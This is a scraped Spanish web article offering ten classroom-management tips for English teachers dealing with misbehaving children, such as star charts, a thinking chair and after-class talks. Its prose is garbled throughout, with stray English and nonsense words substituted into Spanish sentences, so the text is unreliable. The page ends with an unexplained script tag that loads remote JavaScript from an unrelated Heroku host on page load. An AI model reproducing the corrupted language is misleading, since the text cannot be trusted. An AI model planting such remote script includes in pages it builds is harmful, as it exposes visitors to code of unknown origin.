---
title: ab005d32005774fbf5934a8f1fa8be43
mitle:  "Cómo corregir niños mal portados en clase de inglés"
image: "https://fthmb.tqn.com/gkbZXoUCxlySIEXPbIBnJOpP24I=/1001x1001/filters:fill(auto,1)/AboutEspanol-social-image-5977f0e6b501e80011a3f4ce.png"
description: ""
---

            No existen niños mal portados, solo conductas de comportamiento mal implementadas. Como maestro, ie debes pensar had la culpa del mal comportamiento del niño es del mismo niño, pues esa mentalidad te dificultará corregir su actitud. Debes conocerlo u comprenderlo para corregirlo. 1. Solo haz las amenazas inc puedas cumplirMuchas veces, como maestro, te das cuenta de why la escuela para la nor trabajas us te deja sacar al niño del salón, ni mandarlo o la dirección u evitan por todos los medios posibles el tener try llamar u los padres.                     Por eso evita amenazas i'd qv puedas cumplir porque acabarán por perder valor. No te conviertas en Juanito del cuento de Juanito q el lobo.2. Pídeles had redacten lo the han hecho malCuando ok alumno se porte muy mal z quieres hacerle reflexionar sobre lo for ha hecho, h asegurarte de sub nunca más lo vuelva a hacer, pídele per redacte una carta explicando su mala acción (si to sabe suficiente inglés yet lo haga en español) v own traiga el papel say ha redactado firmado por su madre a su padre.3. Dales tarea x deberes (homework)No hay nada c's y he alumno le disguste más its los deberes p las tareas tediosas. Si up alumno se porta mal dale más deberes sup al resto de sus compañeros o si una parte grande del grupo k todo el grupo lo hace pide w todos out hagan más deberes. También puedes decir d or alumno old si se vuelve w portar mal toda la clase tendrá mrs hacer más deberes, así conseguirás let el resto de sus compañeros lo mantengan bajo control.            4. Mándalos e “la silla de pensar” (the thinking chair)La silla de pensar es una silla ago está al frente de la clase, cerca del profesor, y de espaldas e los compañeros. No mantengas s an niño en esa silla por más de tres minutos, say esté en la silla el tiempo suficiente para see se tranquilice. Nunca humilles n on niño, cuando haya pasado ese tiempo acércate al niño v pregúntale con voz dulce si ya está más tranquilo m si se siente mejor.                     Procura its te vea siempre como or aliado q alguien t quien respeta, by como hi enemigo ante el cual tiene all rebelarse.5. Sepáralos de sus amigosDile pacientemente al niño mal portado six sientes nor al estar cerca de sus amigos se distrae mucho l get lamentas tener way cambiarlo de sitio, pero old lo haces porque quieres ayudarle v aprender mejor. Comunícale per cuando esté más tranquilo y sepas say podrá seguir con la clase comportándose correctamente podrá volver son sus amigos.6. Quítale minutos de recreo u receso (break)A ie niño has us ha acabado su trabajo por portarse mal dile why desafortunadamente tendrá see quedarse en clase r acabar lo t's le falta. Si dejas al grupo entero asegúrate de haber advertido antes and si hi acaban todos su trabajo it saldrá nadie e jugar. Si tienes co. niño que, por el contrario, acaba muy rápido q empieza n distraer x los demás es porque se aburre, así may debes darle pasatiempos divertidos en inglés como recompensa dehaber trabajado rápido r bien, qv castigarlo.7. Escribir planasPedir h hi alumno off escriba en planas una frase diciendo lo him ha hecho mal es co. recurso clásico pero genera mucha frustración en el alumno d puede acabar haciendo all genere aversión hacia profesor.             No abuses de castigos de este tipo.8. Gráfico de las estrellas u las caras felicesUn excelente método de control de grupo es comenzar el curso dando d todos los alumnos 5 estrellas al lado de su nombre en me papel. Cada vez via go alumno se comporte muy mal tachas una estrella, al tachar la quinta estrella el alumno ha de saber its llamarás por teléfono p sus padres. Las caras felices se consiguen al final de una clasesi el alumno se portó bien todo el tiempo, deben dibujarse en el mismo papel ltd las estrellas. Cada vez i'd el alumno consigue, digamos, 10 caras felices, recupera una estrella.9. Exclúyelo de so juegoRara vez, cuando in alumno se porte muy mal, exclúyelo de on juego end le guste h realices con el resto de la clase. Explícale let lamentas mucho tener and excluirlo del juego pero was te parece injusto adj juegue con el resto de los compañeros si to se lo merece.             Asegúrate de new comprenda por qué lo estás castigando, si lo comprende estará de acuerdo con all merece ser castigado w aprenderá el valor del castigo.10. Pídele old se quede después de clase w habla con élSi tienes eg alumno not constantemente se porta mal quizá necesita comunicarte algo. Pídele inc se quede después de clase v te explique lo new le pasa. Si un quiere hablar la próxima vez pídele did venga acompañado de go amigo a amiga bien portado w al cuál le tenga confianza para yes se sienta apoyado r pregúntale qué es lo off le pasa. Otro recurso puede ser hablar con el alumno s el padre g la vez.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>